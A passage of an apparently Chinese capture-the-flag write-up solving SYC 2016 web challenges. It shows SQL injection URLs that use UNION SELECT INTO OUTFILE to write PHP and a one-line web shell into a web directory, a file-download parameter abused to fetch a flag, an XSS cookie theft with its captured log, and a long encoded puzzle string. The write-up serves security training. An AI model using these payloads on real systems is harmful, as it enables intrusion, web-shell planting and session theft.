class="line">爆出所有字段：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;path&quot;:&quot;id,path&quot;&#125;]&#125;</div></pre></td></tr></table></figure></p>
+<p>之前看了代码知道id,path这两个是显示图片的参数。到了这里就卡住了，这时候一航同学又一次的站了出来(找一个有写权限的目录)。既然可以用联合查询语句，mysql就用into outfile那就尝试下写个shell,因为是linux系统,测试默认地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://lol.sycsec.com/api.php?img_num=2&amp;img_first=0 union select 1,&quot;&lt;?php echo phpinfo();?&gt;&quot; into outfile &quot;/var/www/html/test.txt&quot;--+</div></pre></td></tr></table></figure></p>
+<p>根目录写入不成功。在浏览网站的时候，我们知道有个images目录，那就尝试这个目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://lol.sycsec.com/api.php?img_num=2&amp;img_first=0 union select 1,&quot;&lt;?php echo phpinfo();?&gt;&quot; into outfile &quot;/var/www/html/images/test.txt&quot;--+</div></pre></td></tr></table></figure></p>
+<p>能访问成功。写一句话。在根目录下找到Flag123asdzpoiwqsd.php，下载一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://lol.sycsec.com/download.php?url=Flag123asdzpoiwqsd.php</div></pre></td></tr></table></figure></p>
+<h3 id="皓宝宝的留言板-score-150"><a href="#皓宝宝的留言板-score-150" class="headerlink" title="皓宝宝的留言板(score:150)"></a>皓宝宝的留言板(score:150)</h3><p><a href="http://web.sycsec.com/42e1f42bcf3c0cfc/" target="_blank" rel="external">http://web.sycsec.com/42e1f42bcf3c0cfc/</a> 听说有很多妹子在这里写下她们对皓宝宝的爱慕之情 学习资料：<a href="https://github.com/l3m0n/XSS-Filter-Evasion-Cheat-Sheet-CN" target="_blank" rel="external">https://github.com/l3m0n/XSS-Filter-Evasion-Cheat-Sheet-CN</a></p>
+<p>解法：看了题目，就知道是XSS了。我们就直接用给的资料里面的参数进行测试。直接用xss平台。偷了一波cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Cookie: flag=SYC&#123;oo_y0u_kn0W_xss&#125;; CNZZDATA1252970113=1534700898-1476063225-|1476171869</div><div class="line">IP: 59.172.176.132</div><div class="line">Date and Time: 17 October, 2016, 5:07 pm</div><div class="line">Referer: http://web.sycsec.com/42e1f42bcf3c0cfc/xss_bcf3c0cfce5eaab9abc.php</div><div class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36</div></pre></td></tr></table></figure></p>
+<p>flag：SYC{oo_y0u_kn0W_xss}</p>
+<h3 id="人生苦短-score-150"><a href="#人生苦短-score-150" class="headerlink" title="人生苦短(score:150)"></a>人生苦短(score:150)</h3><p><a href="http://web.sycsec.com/40a9ddba689f8200/" target="_blank" rel="external">http://web.sycsec.com/40a9ddba689f8200/</a></p>
+<p>解法：打开网站，将方程32+64+py=10(次),py=?解出来提交py，得到Now You See Me，查看源码，发现狗师傅不想理你，并向你丢了一坨神秘代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KMYDCWSSIVHFQVJRJZFFM23II5KVMWSLKVVXAYKSNNNE4TLKJZFFGVCWJRLGWMKYKUYHQTCWNRNFSUKWNRGFKMBVJ5KGWVJQKZCXQTCTNRYEOUTLMRLVCMLEJNKWW6CIKYYDCTCXKV2FMV2VNBJFMRKOLBKGYSSPKJWE4VSTGFSE6VLLMRDVGMBRINLGW3ZRKMYGIWCWNNYFEUZROBCFORSGKVITCUSPKVWGYRSUGFLFKVCFGFJVIRS2IRKFK6CGKNVTKTCWGFRTEUJQNRGFOVTMIVITCUSEK5CXIV2NNNNE4VTKJJLVI22KJNJGWMKTKMYDSTKRNN2EQV2WJZKFKRLUJNLDAVJQKZWE4VKSGBNFIUSULJLVIRLYJZKWWUSXKIYDCQ2VNNWE6VCFMRME2MLQKNJTAMK2KIYGYWCRGFSE6VDMNRDVEVSWMFKWWOKDKEYFUUCVNRHEQUZRLJFFMRKOKZKTCQSMKZWGISCXKZFFIVSVMRDVIRK2JRLGWTSHKIYFUS2WNNWFGVL2JJFFK23UI5JXUWSEKIYHIT2WNRJEYVSFJZMFEMC2KNLEKVSWKNWEMT2VNNSEOVBRLJKVIVLMK5JVMUSEKZLE4RSTPJLEIV2FNRLU22ZVJ5KGWNKGJZDFUVKTGBYEWVCGLJFE22SKJRJWWNKLKIYWITSTGFJEYVCWNRCVKMKSJRKWWNKPJVVVMUSWNJFFQU3MOBGFE23UKNKEMVSLKRVXQRKRKZNEWVKVORQVMMCVGBLGW5CUKIYEUT2SNNWFMVJRKZGVG23YK5JVMSSNK5KXAYKTGFSFQVSWJZMVGMDMLJJEKTSSJVWFUT2UNRSEMTTMLJCFE2ZRKNKFKVLZKRKXQUSTGA2UWVSFIZHFG6SKJRJVM3CIK5LGIRCVNNSEOVJQKUZFM22SJZKGYSSFKZVVMV2VGFSE4UTLORMFMMBZJRJEK5CGK5KVUVSWKVHFOVDMJJEVEVSGKZLWYSSNKNVVUR2UKZFEYVBQORQVGMKSIRKVMTSOKMYXAWCSGBWFIUJRNBGFO222I5JVMWSUKZVTCU2SIZNEUVLLON4VG3CKJVJDCZCVKUYGQTCTKZWEOVSWJV4VMMBVJ5LDAWSIKZVXO6KTNNYEOUTLON4U2MKWJJHFK4CZKZLGIVCSKV2EUV2VNBFFMRCKLBKGYSSLKJLGYV2VGBNEWV3LGFDVEVJRIRGWW5CPKRCVMTCWNRHFQUZQGVMFEVJRKVGWYWSPKRWE4RSUGFNEGVLLPBFVGMK2JJLGW6COKN5FMS2WNMYVMVJQKZGFO23YIZHEMSSUKZDEES2UIVLEUVTKJJDVI3CKJVLFISLZK5WFUS2OKV2EQVRQGVGFEMDQMFJEKWSWKZVXIVKSGBFFUUSWMRLVCMDEJVJWWWSGJVVEUVCTGBYFGU3MMRMFI23UJVJTA3C2KYYGYVKVGFJEQUTLOBDFOVS2IRLDANKTKEYVUTCUKV2FIU3MJJGFMMLEJ5JTCQSLKZWFUV2UKZLFIVRQGVFVE222KJLFITSOKQYEUSCSNNKXSTJRKZGFI23UIZKFMWSUKRCXIU2WNRUFEVJQJZMVGMKKI5JFK3CWK5WEMUCVNRDFOVCVGFCFM23EINKEKZCYJZKU4WCTGFFFQUSWKZJU23COJRLFIUSXKRLFUS2VNMYVGU2GLJGE22SOLJJXUVSMKJVTCVCVGA2UYV3LORMVCVSVPFLEKNKTKUYFUUSWIZJE2U3MOBHFM23EJZIWYWSLKZVXASCXKZNFIV2FORDFOVS2IZKTATSTKRWEUWCSKU4VOULMJJGFO3CGK5JTCWSNK5KXAT2TNNJEEVRRJZGFGMLQK5LUMRSXKUYVET2UNM2UMVRRLJKFE23MMFJUKWSIJZWE4TCTNRFEWVTLGB5FCMDMJRHFK6CIKNLEURCWNM2U6VJQKZIFM23QKJJTCVTBKJVTA6KNGFWEWVTLOREFMMKOKRJGW5DBKZWGQSSWNJFFOURQLJKFEVCSKZLEK6CQKVVTCR2UKUYUGV3LOBJVG22WJRHFKTSVKMYDCWSWNRLFOVJRLJHVK23IIZHGYWSFKRCTSQ2SIZNEMTJQJZEFGMLQJVLDC3CUKUYDKTCUNRNFQU2WJF4VMVLUMFJGWVS2KZVUUUSUGFFFEVTLMRHFGMKOJJJWWZCVKFLFEVCUGB2E4V2VNBBFMMCOKRJDASSYKJVWYVSTNRFE6ULLMRDVI6SJPFGWW2ZRKNWFUTSWGFHFOUZRJJCFMRKOKZGWYTSKK5VTKRSWKZNE2VCFHFHU4RS2JBGTATSMKNWFUS2SIVHGCUJRLJGFMVTMJBKVMUSEKZCXIYKWGBLFAVTMJZMFG3DQJBJGW5COKFWFUS2XNNUEMU32JJCFMVLUMFITC2CSKZCU4VKUNM2VUUSVHFLVMRLYKBKGUUSWJVVTCTCWGBYEWU2FLJGE4RKOMFJTC4CNKIYGYV2RGFHEYVTKJJDFMVSZPFLGWNKDKJVVUTSVNNHEYVCFJJGFEMLMKRKTA6CMKNVXQSCXKZMXSVTLMRBVI22WLBLGUTSNKIYFURKWNNLFOU3MJJFFK23ELBLHUVSEKVCXIU2RGFNE4VSFJZMFI3CKJFJGYRSWK5WEMSCWNMYUOUSWLJFVK23UK5JDCZC2KYYU4UKTGFFFQUSUKJJVKMKWJBJGWNKGKIYVUTKUIZBEGUTMLJEFIVLTPFJWW4CNKIYWGMSRGA4UYVDKKZDVIVSNPFLDANKOK5LFUTSWNNYFEUZROBEFE2ZYPFGTC3CKK5VWQRSUKZHFIVSVORQVERKWIZKXUSSWKNLFUTKSKZLFOVSFORFVG22SK5JVITSEKMYHAV2UIVNEUVJQPBQVG6SWLBJGYVSUJVVTSTCWNJFEMVKWLJJVKVLEK5JDAWSGKRKVEUSUKVNEWUSVORMFKMLEJRLWYWSZKNLFUTCVGBSEGUTLLJLFMVSOLBKFMSSNKZVU4TSSIVLEWVTLOBMFMMLEKRJDA4CXKZVVMVSWNNHFKURQJJNFE23EKZGTAMKOKVVTCR2TKREXUVSVOBLVG3CSIJGTATLZKMYWYWSSGFWFOUZRLJEFE23QIZKVMVSVKRCTSQ2SIVNFAVTMJV4VGVSKJVJEKRSPKMYVETCSKZWFOVSWKJCFMVLUK5GWWWSKKZKE4TSTNNYEQUTLGFHFIRKWJNHFK4CVKEYUMVCUIV2GCVRQLJLFM2SKKZJTC4CNKJVWYV2VNRDEQVTLLJLVEVCJPFGWW5CLKRCVUSSWIZHFAUZRIZNFEVSWKRITCTSPKRVXIWKVGFJEWVLLORQVEMC2JJGWUTSWKNLHATCSNMYVQVJRKZGFK22OLFJVMVLZKYYDKU2WKVNEMVTLOBJFG3DQJZLGWZCOKMYHISSOKVYEOU32JZCFMMDTGFLDAVSOKZKU4V2UNRFEKUTLHFLVCMK2JBJGWTSHKRKES6SSKVWE6UZQKZGFO22OLJJWY4CMKZKFEWCRGFJEQUTLLJDVKVSWKRLDA5DBKNWFK6KNGBHFAU3MJJGVE23MKZKTC2CMKVVXQR2WKZGXSVTLGVHFOVS2JBLFISSIKRCXASCSKREXSVJQHFGVG23QLFLFMWSUKRKXIS2WNRJEIVTLJZLVEMCFPFLFM3CXJUYHQUCVNMYVOUJRLJKFM3CCI5KEKVSMKRVXIVKTGFLFUUTMKZLFKMLEJJLWW4CGJVWFK6SUKU4UGU2FLJHE22SOIZJWY4CLKJKXITSTGA2UYVDMLJMVCVSKKRLEKZCHKNVVUSSWNNYFEVBQJJGVM2ZRJZIXUSSMK5VXQRSTKZHFIVRQORJVMMCWKZLGWTSUKMYVKMCWNM4VMVCFGFFVG23EK5JHUSLZKQYGWMKTNNNEUVJQO54VG6SWJRLUKRSVJVWFET2UNNYEMUSWLJKVIRJZINJWWWSIKRKXG6KUIVFEWURRMRLVKMLEJRLFM3CXKJLE4RCVNN2FGUTLLJHFM3CKKNKEK4CMKJVVK6KNGAYU4UTLOBLFGMLEKRJVK4DBKYYFKMCWIVHFKVDMJJDVEVTEK5LEK6CIKFVFMR2RGAYUKVCVOBJVGRK2JRHGWTSKKMYDKTKSKZLFGUJRMRHVIVCKKZHGYWSLKVKXIYKTKVNE4TLKJZJFGMDQJNLEKTSXKZCUUTCTNRNFKUKULJGFI23EI5LDAVSYKZWFETKUGFFEMUTLGFHFGMBZJRKWW4CIKZ5FMRKRNN2GCVRQLJGFIVKOLBKGW4CHKJVTSVSVNRDE2U3LORDVEVS2IRKTA5DBKRCVMTCONNHFEUZRLJLVMRKOKNGWYVSMKZLGYVSSGFMXUVCFHFBVG3C2JBGWUSSYKNWEUSKSNN2FKVJQNRGFI2SWI5KFMUSEKYYDKU2UIVNFAVTLOBJVIVSKJBJGWMDZJUYGYSSOKV2EKUJRMRKFE23UKNITCZCKKZKEUUCTKZYE6USVGFLVMRJRJNLWWVSHKIYDCTKVKVYFOVCFKJCE2MCOKZJTCVS2KZKTCVKRGFHE6VLLGVDVKVSVPFLDA4CHJZDFUTSWNN4FMVCVLJFVEMLEK5KXUSSMK5WFUVSWKZLFIVSVMRDVE222IZLGYUSNKRLEUSKSNNSE4UZQHFFVG23QLBLDC4CEKZVXIR2UIVNEMVTLJZLFEMCJPFJFIUSXJVWFUT2RNNFEOVCVGFCFIMDUKNJWWUSCKUYU4WSTGBYFOVRRNRLVKMKSJ5KWWWSGJZWFMTKUIUYVGUSGLJFE43COJNKUKWSIKYYWG6KXNRFEYVDMMRDVMVSSKRLDAZCHKNCVUTSWKZYFEVBQJJGVM2ZRKNJTAOKMK5VWIWCXKZJFIUZQOMYVM3CSJRKWYTSYKMYXAT2SKRFFOUJQLJEVE23IKZHEMSSUJVVXAQ2SGFJEEVSGJZHFGMBVLBJGYVSUJVWE4SSWNNUEQUJRKZFVK23YJNJDAWSOKZWFETSTNNFEYVTLGFLFKMCWJRLWWTSZKNLGYTCWGBSEGVCFLJBFM3CSJZJWY4COKJVWG6SRGFYEQULLPBEFMMBRJRKDA5CHKYYFUVSVPJFFAUZRLEYFEVLUKZJTCZCOKVVXIR2SGFNE2VSVGFDVIRLELJGWWTSSKNWHAV2XIVWFOUZRKZHVIVCKK5LFMVSUKZVWQR2UIVNE4VLLPBNFGMCKJRJDCVSWKUYWIS2WNRNFKUJRKJCFMMDEINLVKVSYKZKEUR2UIVYEQUSUKJJVGMBZJZJGW4CVKF5FERCUNN2EUV2VMRNFM2SKKNJDAWSJKJLGYV2WIV2EWU3LKJDVIVS2KRLWYQSHKRCWIWCUNN2EKUZQOBLVM3CWKVKTCWSPKRVWQRSXKZNEIUTLOBFVEMC2IZKFK6COKMYUUTCWIVCTEUJQGFGFI3C2LFKVMTSEK5CXIYKUKZUFIVTMKJGVIVSKINLGW23ZJVWGITKRNN4EQVSWKJKFI23UKJLVMVSWKVVXIWCUNM2U2UTLHFLE2MBRJNJWWWSHKN5ES6SSKV4EGVCFNBLFM3COIZJTCWSEK5CWYVSNNRFEQUTLGVDE4RS2KRJGW4DBKRDFUSSNGBHEYU3LLJFVEMLMKNKTCZCMJZLGIRSUKZHEIVRQGVHFOVSWKBLFMTSYKRCXAR2WNNZXSTJRKZGE4VLQKVITCVSUKJKXIWSXKZKTAVSVORKVEMC2I5JGYRSWKUYVMTCTNNYFOUZQGFGFMMDQINJWWZCYJZKU4YKTGFLFUVTMKZLE23C2JRLWWSSGKIYVMVKUKV4EWUSVLJFFM23YKVKUKWSLKYYWGMCRGA2UYU2WNRMFEMBRKRKWWZCHKRVVMWSWKRFFQVDMJJCVM2ZRK5KTANKRKJVXQRKRKZYEIU2FORLFOVK2KZLFMTSYKRVTKWSSNNLFMTLLLJGVG22WI5JFISTBK5VXGMKUIVLEYVCVORHFG6SWK5LDCRSTKUYVMTCXNNUEOU2WLJKFM2ZZKNKVMWSGKVVXIWCTKZYEYV2GKZKFKMLEJRKGW6CHKZLFETCVGB2GCVCFLJIFM3COI5JDAWSHKZVWG6KNGFDEYTSVOBLVGVSSKRJFK5COK5KWQQSWNJFFMU2WLJHVEVSWK5JWYRSRKFWEMV2SPJNFIVRQPBBVG23ELJLGYTSWKNWFUV2WIZHFKUJRMRHVG222IZKFMWSMKYYHQS2TNRNEYVTLPBDFG6SWJNJEKRSYKUYGITCVNN2FOUSWKZKFMVLUK5KGWVSYKZLE4V2UGFFE4UTLORHFIRKWJNKWW6CYK5LGIVCXNN2E6VCFLJLFMRKOK5JDASSUKJKWIVSWIV4E2U3LPBDVIVS2KRKDA6CDKMYFUTSVGFHE6UZROBLVMVCSKVKTCUSRKNVVURSWGFNFKVCFHFBVIVK2JZKFK6CGKMYUUS2WKVZTCUJRIJFVO23UK5KFMWSEKQYDKU2TIVNFIVSWOBJVIRKZGBLGWVSXKZCVMTCXNNSFKUKVGFGFIMDUK5LGYUSEKVVEUVSTGFLFUVSWNRLVC3CGKBIWW6CXKJ5E4RCVGBWEWURRKJBFMRLYMFJTAMK2KYYWYWCVGFHEQUTMMRDVIMKWMFKWW6CLKJKVURSNNJHFEU2WOBGFM2ZRK5KTCWSMKVVU4VKVGFCXSVJQNRLVI222IJLGYUSOKNWFSMCWNNSFOVJQORFVM23QIZJTCSSUKVCXITSXKZNEMVSFJZKFGMLQLBJGWOKXKUYWITCTNNHEOVCWLJGVMVLTGFJDCZCYKYYU4TCTGFYEYUSWKZMFCMKSJ5KGY3CGKVLFUVKUIV2GCU3MLJEFIVKSIZJWWNKJKJVXGMCRGFNEYUSWNRLFIVS2IRLFK3CXJVVWIRCWNRFFEVCFOBGVE2ZQPFKTA5CMK5VXAVKRPJJEIVDLORFVM3DELJLGUSSXKRWEURKSKZDFOVSFPBGVG23YK5JFMWSEKNWEER2SGFSFQTSVJZGVGMKKIRLGYVSUKUYWISSXNNUEOUKWKZQVK23MMFKGWWSGKZWE4WCTGFFEUVSFJZKVKMKCJRKWYWSZKNLGITCWNNSEOU3LKZMFM23YJVKDCSSSKZVVMTSRPJFEWU3LMRMFMVSSKRLDA5CPKRCWQQSWIVHFIVDLGFNFM3CGK5JWYSSMK5VWIR2TPJEXSVBQPBDVG3C2JZLGW6DBKMYWYWSSIV2FMTLMMRGFM2ZVIZKFMWSVKRDEEQ2SGFNEUVCVORGFG2ZVJVJDCZDBKEYDSTCVNNJEMVCWJV4VIMDUK5LVKVSQKZVU4WCUGBFEIUTLHFJVIRSWJNLWW6CXKRLGIVCWGB2GCUZRKUYFM2SKKZKGYSSHKJKXIVSWIV4ESUTLPBLVCMBRJRLDA4CPKNVWIVSWKZHFSUZRJJGFMRKOKNJTCZCMKZLGYVSUGFLGCVKVORQVEMC2KBGWUSSQKRCXAS2WGFVTAUJQGFGFO23UI5JFMWLZKZVWIR2TNNLFEVSVPBHFIVSKIVLGWMKXKUYWITCVNN4EKUKUKZCVC23UJZLVMWSMJZVXIT2SGBFESUTLIZLE2MDUJRLWWZCHKJKTCTKUKUYUOU2WKJBE222OJZJTCWSXK5DEMU2NNRSEYV3LMRMVKMK2KVKEKZCXKNCVUUCWNRGXSU3LJJGVE23MKRKTA2CMKVVU4WKRKZHEIVJQORJVEVTIKRLGW4CSKNCVUSCWNNRXSTJRIZGVE23YI5KFMZCUKZKXIU2TGFUEUVL2JJMFI3CKJNJFK3CXKZCXQS2XNN4FOUSVGFCFE3CCI5KEKWSOJUYE4WKTNRLFUU2GIZLFCMK2J5KFM3CXKQYVMS2VNN4EWUZQLJHE2MCOIRJVIVSMKJKXIV2VGAYUYVLMLJMVGVS2JRLEKZCHKRCVUVSWKZJE4UZROBGVE23UJZKEKVSLKNVXQWCWPJJEIURQOBLVMMC2JRHGYTSWKMYVKMCWKVSFMTLLLJGVG23IIZGWUSSUKQYGYYKTNRSFUTSFJZGVGMDQJRLUK3CVKUYVESCRKRFFMV2WLJCVIVLYJNKFMWSEKZWE4TCTGFFE2USVORQVCMDIJRKGYWSXKZLE4VCWGA2U6V2VLJDFM22KKJJWW4CIKZVTA6KXNRFEWV3LNRMVMVSOKRKFK4ZRKZWGQUSVNRHFKUZROBEVE23MK5KWYRSQKVVXAV2UKUYUIVRQORQVIRLELBLEMTSWKMYDCWSWNN2E4UJRMRHVIVCSK5KFMWSEKJVWIR2SNRNEQTLKJZDFG6SWJNJUMVSUKRDHATCVKZWEQVRQGFGFMRJVJ5KGWVSWKZVXAUSUPJKTAVTLMMZFKMLEJNKWW6CWKMYUUVCWNNYFOVRQLJDFMRCKKZKGWNK2KJKTCVSVGFSE2U3LORLVGVSKJNLWW3CPKNWGIWCWGFHEUUZRJJGFORLDGJJTCVSKKZVVURSWGFLFGVLLGFJVIRS2JRKFK6CGKNWEUTKSNMYHUUJRNBGFG23YIZHEMSSEKZVTKT2NNNNEQVSWKJGVIRLQJFJGWMD2KEYHITCUNN2EMU32KJCFIVLUJNLGYWSMJZVXIT2SGBDFUVSUKJLFMRLYKBIWW6CHKIYDCTKSKV2FGU3MLJGE4RKSINJTC3C2KJVXITSRGFSEUVTLNBDVGMK2IVKFK4CLKJDFURSWNRJEMU32KZGVEVLTGJITA3CMKJWFUR2UKZEXSVLLMRBFOVSWJRLGWTSXKQYEUS2WNNSFGU32JJFVK23IJBLDCUSUKMYHITSXKVJEYVSFORKFGMLQJVJGWZCWKNWEUTSVNNUFOU2WLJCFGMDUMFJUKZC2KYYU4TKTGFNEYV2FNRNFGMKSJRLGWNKGJZDFETKTGBYGCU3LLJEFIVKSKJJWWNKNKJKXIVKVGFUEYV3LJZLFMVSSIRLEKNKTKRVVUTCWKV2FMVCFOBEFE23LPFGTAVSKJZKXQRKRKZNFIV2VORQVMMC2IZLEK5CWKIYFUR2SKUYVMVSFPBEFE23II5JDAMKDK5VXAU2TGFSFQTSFJZFFGMLPGFJGWMKTKEYVMSSWNJFEQUJRLJJVKVLYJNJEKWSOJVVEUUCUIVFEYURRMMYFCMDIJRJWYWSVKUYVUVCWNM2VGUSFKV4VMVCOJVKDCSSFKZVVMV2VPJFEUVLLORKVCVCWIVIWW5CTKEYVUTSWIVHFAVDLGVEVE22WKZLWYSSNKNVXQV2UKZFEYVBQORHVEMLELJLGYTSOKMYXATKSGFWFOVJRJZEFE2ZRLFLFMWSEKJVWQR2RNRNEQTJQJV4VG22KJBLDCVSUKUYWYTCUNRSEMVSWJZGFKMBVJ5GWWWSMKZVXAUSUNRFEQUTLNN4VKMLEJJHFK5CHKRLFMVCSKV2FUV2VKJGFMVCKKZJVMWSPKJVUMV2WIV4FAULLOBLVGVS2KRJTA4CDKNVWIWCUKVJGCU3MKZNFEMLMKRKTAOKMKZVEURSTGFLEWVLLGFJVGMC2IZGWUTSWKMYDKSSWIVHGCUJQORGFO23UIZLFMVSEKZCXIYKXKVKTEVSWJZLVEMC2JVLGWMKTKNWEUS2UNN4FQVRRLJKFGRLUJJLVKUSEKZCXIV2TGFNFUUTLHFLVCMC2JRJWWTSGJVVTCRCUGB2GCU3MKJCFM3CNPFJTC4CMKZCU4V2TGFFEQUTLNBDE43C2JVKEKZCXKJDFUTCWNRHFOVKFLJGVERKFGBITA2CLK5VVER2WKZJFIVRQGVHU4RK2JZLGWTSXKRCXAR2WNNLE4VCFKZGE4VLULFLFMTSUKRKXGMKWGBNFMVTMJZMFGMLQJVJGW3CXKUYVUTSVNNJFOUSUJF4U223MMFKEKZC2KZLE4T2TGFFE2USWKZKFGMKOJ5KGYTSGJZDFMYKVKVUEOUTMLJEE22SOKJKEKSSNKJCU2MCRGBLEYV3MLJMVGVSJPFLFK3CXKRVVMTSWNRJE2U3MOBGVE22WJZITA4CRKJVXAR2TKZLFIV2FOBLVMMC2KZLEISSTKRVTKR2SKU4VOUJRLJEFE22OI5JVKMKFKZKXIT2TNRSFQVSWJZCFGMKWLJLFIUSYKUYVESCRNRWEOVBRLJJVK2ZVKNKEMWSMKRKXIVCTNJLEYVRRMRMFKMDEJNLWYZCHKRLFETCWKVWFMV2WLJEFMVSOJBKEK4CHKJKFC6SRGA4UWVDLORLFGMLEKRJVK5C2K5LGISCONN2FSVDMJJDVEVTMK5JEKMKOKVVVEV2UKZNFIVJQORJVIRKSIJLWWTSJKMYDKRCWNRLFKVJRMRGFO3DMI5JFMWSDKVKXAS2SGFNE4TLMOBJVGMBVJNLEKRSQKMYDCTCOKZNFQU2WMRCFORLUMFJWWWSKKZLHAUSUGAYVUVTLGB5FCMKOJNKWW5CYK5LFEVCXKV2E4V2WNBBFMRCKKRJTCSSHKJVTSVSTNRDE2U3LKZLVEVCJPJJVK5DBKNCVMTSVGFHFMU3MLJLVORKGKJGWYTSIKJVXARSSKZNFIURQOBQVGRK2JBKFKSSXKRCUUS2SGFWFOVJRKZFVM3DEIZHEMTSUKYYDKT2WKVLFEVSVOBJVGMLQI5LGW43ZJUYWYS2UNNYEKUKWMRKFIMDUMFLDAWSGKZDE4VKUNM2UOUSWNRLVMRLYJBJGW6CHKMYDCRCWGBYFGVCGMRMFMRSOMFJTANKNKIYWYVKRGFSEQULMJZDFEMK2IRJGW6CLKFVVUTSNGBHFIU3MOBFVMMLLGBITAOKMKNWFUWCSPJNFIVJQNRQVERKWLBLFK6CNKQYEURSSNMYU4ULMJJFVK23UIVIVIVSEKRCXIS2RGFNFMVSGJZMFGVS2JFJGWMKXKJCXQSCWNM2UOUSUJZCFEMDTGFJTCZC2KUYU4UCTGFNFOV2FNRJU23COJBJGWNKGJVWFUVCWNNSEOUSGLJFFK23YIZKEK4CIKYYWIVKVGBLEYVCWNRMVCVSSIRKTA5DBKRCVUUCWNNYFGUZQOBEFE2ZYPFLWYWSKJZKXQR2UKZNFIVSVORNFOVLIJJLVK5CWKNLHAT2SKRJFOVCFPBIVC2ZVI5JHUTSEKMYHAV2TNNJEIVTMJZMFGMKWLJLDA3CUJVWGIT2VNM2UOUZRKZFVK23QJNITAWSOKRKVERSTKU2U2VTLORMFKMKGJRLWW5CGKZLGIRCWKV2GCUTLKUYFMVSOKZJTAWJQKZKES6KXNRYEWVDLOBEFM6SSIRLGW5CGK5LFKMCWNNHFMVDLGR4VEVTEK5LEKMKMKNVU4R2UKRFFIUZQORHVG22SIJLDCTSWKMYHATKSGFWFOTLMMRFFM2SKIZLDCVL2KRCXIS2UIZNEUVTMJV4VGMKKJVLDC3CSKUYGQTCVNNHFQU2WMRCFMVJVJ5GWWVSMKZLHAUSUGBFE2VTLGB5FCMLEJRLGW5CVKEYWIVCVIV2FGVTMMRJFK3COLFJTC4CPKJKWYVSWIV4FAULLLJLVEVJRIRGWW3DBKMYFUTCONNHFAUZQGFNFMVSWKVITCZCKKZVU4VKSKZLEWVKVMRDVEMC2JJGTATLZKRCVUTCWNMYVKVJQKZGE4VKOLFJVM3CMKZKXIYKWKVNEUVTMKJHFGMDQJBLGW3CXKUYHISSUNN4EQVT2JF5FO23QK5LDAZCKKZCXIU2UNM2DAUSWIZLVKMLEJRJWW5CHKNKES6SWKVYEWVCGLJGFMMKOLBJTCWSXK5CWYWCRGFLE6VCUJJLE23CWKVKEK2CHKRCVK6KUKVFFGU3LGVFVMMLELBKTA2CMKRVFMRSVPJNFIVJQORLU4RKWJBLGWTSHKRVUUTKSNMYHUUJQHFFFO23QKVITCZCUKJKXGMKRGFSFUVTMJZHVI3CKI5JFMRSWKZCXQSCWNNJEMTSGJJKE223UKNJWWZCYJZCVEQ2TGFFEKUTMKZKFKMBVJBIWW2CGK5LFK6SUIV4EWUTMLJDFIVLYJZJTANKMKZCU4YKRGAYUWV3LPBEFGVSKKRLFK5DBKNCVMSSWNRFFEURRLJEVE2ZZK5KTCZCMKFVXQR2UKZJFIV2VORJVCMLIIJKWUSSYKRVTKYKXIZHFKU3MJJGFO23EIZHEMWSNKVKWYV2TKZJEITSFJZDFG3C2K5LUK3CYKUYWQTCXNN2FKUKWLJKFM2ZZKNJTCWSGKRKU26KTKRLEWURRNRJVKMLEJRLFM3CXKRLFERCWIU2U6V2VLJIFMVTQKJJDAWSIKJVTCTSSIZDEUVDLOBMFMMLQIRLVK5CTKZWGQSSVGBHFKURQJJMFE3CWK5LEKMKMK5VXIV2SGAYUYVRQOBFVIRTELBKTCTSIKMYGYWSWNMYVOUZRKZGFM2SSIZLDCVSUKZVXQS2SNNNE4TLKJZNFGMK2JRLFK5CYKUYHQTCXKZWFQURQGFCFK23EIJGWYVS2KZKEUWCUNRFE4UTLKZHFC3CKJRKWW5CYKYYXARCRGBYGCUSFLJHFMMKOLBKGWNKLKJLGYVSXNRFFAULLJZLVIVCJPJKFK4ZRKMYVEQSUNN2FGUZQOBLVORSGKNJTCSSMKZKEUVSXKZNEGVKVHFHFOVS2JJKWW43ZKMYXATKSKUYVKVJRNRGFK3C2KVJTCZCUKUYDKT2UIVNE4VTKJZHFG23QJJJGWTLZJVWGISSOKVYEOU2WJZKVC23TGFKEKVSGKVVEUVCSGBNEWUSVNRKVG3CGJNLWWZCHKJ5FUVCWGBZTCVCFKJCFK3COKVJTCVS2KZVTCVKRGFUE6VDMKZDFIMKVPFLDA6CLKMYFUTSNNRYGCUZQGVGFM2ZRLBKTAZCMKZWFUWKTKZSEIVSFORQVOVKWLJLGUSSIKMYXATCSNN2E4VCFKZFVK23UJBLHUWSEKNCXIYKUIVNEMVSFJZLVEMCJPFJDATSXKEYFUTKTNNWEOVCUJZCFIMDLGFJTAUSEKUYU4SKTGFYFOVRQMMZFGMBVJ5KWW2CGK5LFEVCWNM4UGVCGLJEFM3COKRJTCSSLKJVXGMKRGA4UYTSVORMFKVSGKRLDANKLKJVVUTSWKRFFQVCFOBEVM22WK5KTCZCMJZKXAWCXKZFFIVLLORDVMMCWJZLGUSSUKVCXAT2SNNWFOVLMIZIVC22KK5JHUSL2KJKXQS2UIVSFUVSGJZMFGMBVLBJGYVSXJVWGISSXNNUEOUZRKZFVK2ZRKNJUMWSIJVVES6KTKZYEYUTLGFMFKMBRJRLVM3CJKVLE26KWIU2VGVDLKZNFM3CSJVKUKSSFKJVWGMSVGFSEWVDLOBDFGMKKKRLVK5CWK5KWISSWIVHFOVDLGR4VE2ZZKZKTCZCMK5VXIR2UKZNE2VSVOMYVGMDELBLGYTS2KMYXATKSKRJFOTLMKZEFE222IZHEMVSVKRCTSU2TIVNEUVLLORMFG2ZVJRLDCYZSKEYWYTCOKV4EQU2WLJCFORJVJ5GWWVJSKZVU4R2UIVYE2UTLGFJVGMBZJRHFK4CFKFLE4VCWKV2EWUZRMRFFM3COLBJVMWJQKJKEUVSNGB4FCULLKJLVGVS2KRGWW5CTKMYFEQSONNHEKUZQ